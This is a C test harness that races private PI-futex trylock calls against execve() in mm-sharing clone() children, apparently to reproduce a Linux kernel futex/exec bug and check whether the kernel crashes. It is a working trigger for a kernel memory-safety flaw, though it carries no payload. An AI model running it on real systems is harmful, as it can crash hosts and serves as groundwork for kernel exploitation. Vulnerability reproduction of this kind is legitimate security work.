/*
 * l79_futex_pi_exec.c - drive the pre-6.18.47 private-PI-futex exec() race.
 *
 * exec_mmap() on this kernel still does:
 *
 *   exec_mm_release(tsk, old_mm)  -> futex_exec_release():
 *                                      exit_state = EXITING; cleanup_robust_list();
 *                                      exit_state = OK;        <-- window opens (pre-fix)
 *   ...
 *   tsk->mm = new_mm;                                        <-- window closes
 *
 * Inside that window a PI-futex operation on the *old* mm still believes the
 * exec'ing task is alive and can attach a pi_state to an mm that is about to be
 * swapped out and eventually freed.  The fix keeps exit_state == DEAD across the
 * gap and only restores OK after the mm switch.
 *
 * Harness shape: a fresh process H forks its mm-sharing sibling processes with
 * clone(CLONE_VM|SIGCHLD) - CLONE_VM so they share the mm, no CLONE_THREAD so
 * exec() in one of them does not kill the others:
 *
 *   O - takes the PI lock, then execve()s.
 *   W - hammers FUTEX_TRYLOCK_PI (the attach path) so a fresh attach attempt is
 *       always in flight while O walks through exec_mmap().
 *
 * Nothing is written to the device; we only watch whether the kernel survives.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define STACK_SZ (64 * 1024)

static uint32_t g_word;
static volatile int g_ready;
static const char *g_self;

static long now_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000L + t.tv_nsec;
}

static int futex_pi(uint32_t *uaddr, int op)
{
    return (int)syscall(SYS_futex, uaddr, op | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static void pin(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu % 8, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* waiter: continuously enter the attach path */
static int w_fn(void *arg)
{
    int cpu = (int)(long)arg;
    pin(cpu);
    while (!g_ready) { }
    long deadline = now_ns() + 30L * 1000 * 1000;   /* 30 ms of attach attempts */
    while (now_ns() < deadline)
        futex_pi(&g_word, FUTEX_TRYLOCK_PI);
    _exit(0);
}

/* owner + exec side */
static int o_fn(void *arg)
{
    (void)arg;
    pin(2);
    futex_pi(&g_word, FUTEX_LOCK_PI);
    g_ready = 1;
    for (volatile int i = 0; i < 3000; i++) { }
    char *av[] = { (char *)g_self, (char *)"--exec-side", NULL };
    execv(g_self, av);
    _exit(3);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--exec-side"))
        _exit(0);

    int iters = argc > 1 ? atoi(argv[1]) : 500;
    char selfbuf[256];
    ssize_t n = readlink("/proc/self/exe", selfbuf, sizeof selfbuf - 1);
    if (n <= 0) { printf("readlink failed\n"); return 1; }
    selfbuf[n] = 0;
    g_self = selfbuf;

    printf("=== l79 futex PI/exec race (uid=%d, iters=%d) ===\n", (int)getuid(), iters);
    fflush(stdout);

    long t0 = now_ns();
    int done = 0;

    for (int it = 0; it < iters; it++) {
        pid_t h = fork();
        if (h == 0) {
            /* fresh mm for this attempt */
            g_word = 0;
            g_ready = 0;

            void *so = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            void *sw2 = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            void *sw = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            if (so == MAP_FAILED || sw == MAP_FAILED || sw2 == MAP_FAILED) _exit(4);

            pid_t w1 = clone(w_fn, (char *)sw + STACK_SZ, CLONE_VM | SIGCHLD, (void *)1);
            pid_t o = clone(o_fn, (char *)so + STACK_SZ, CLONE_VM | SIGCHLD, NULL);
            pid_t w2 = clone(w_fn, (char *)sw2 + STACK_SZ, CLONE_VM | SIGCHLD, (void *)3);
            if (w1 < 0 || w2 < 0 || o < 0) _exit(5);

            int st;
            waitpid(o, &st, 0);
            waitpid(w1, &st, 0);
            waitpid(w2, &st, 0);
            _exit(0);
        }
        if (h < 0) break;
        int st = 0;
        waitpid(h, &st, 0);
        done++;
        if ((it & 0x3f) == 0 && it) {
            printf("iter=%d elapsed=%.1fs (%.1f/s)\n", it, (now_ns() - t0) / 1e9,
                   it / ((now_ns() - t0) / 1e9));
            fflush(stdout);
        }
    }

    printf("done: %d iterations in %.1fs, no crash\n", done, (now_ns() - t0) / 1e9);
    return 0;
}



